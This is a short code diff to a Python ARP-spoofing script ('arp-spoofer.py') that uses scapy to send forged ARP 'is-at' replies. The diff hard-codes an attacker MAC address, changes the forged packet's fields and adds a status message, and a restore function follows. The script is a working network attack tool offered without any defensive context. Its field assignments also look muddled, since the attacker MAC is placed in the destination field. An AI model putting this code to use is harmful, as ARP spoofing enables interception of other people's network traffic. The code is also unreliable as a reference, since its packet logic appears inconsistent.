@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 '''
 arp-spoofer.py
 --------------
@@ -9,10 +10,11 @@ from scapy.all import *
 import sys
 
 def arpSpoof(dest_ip,dest_mac,src_ip):
-	# TODO spoof it up...
+	attacker_mac = 'c8:b2:9b:62:70:0f'
 	packet = ARP(op='is-at',hwsrc = dest_mac,
-				psrc = dest_ip,pdst = src_ip)
+				psrc = dest_ip,hwdst = attacker_mac,pdst = src_ip)
 	send(packet,verbose=True) # Originally set to 'False', but I like True, I think?
+	print('sent packet to '+dest_ip+' ('+dest_mac+') '+' as '+src_ip+' with your hwaddr ('+attacker_mac+').')
 
 def arpRestore(dest_ip,dest_mac,src_ip,src_mac):
 	packet = ARP(op='is-at',hwsrc = src_mac,
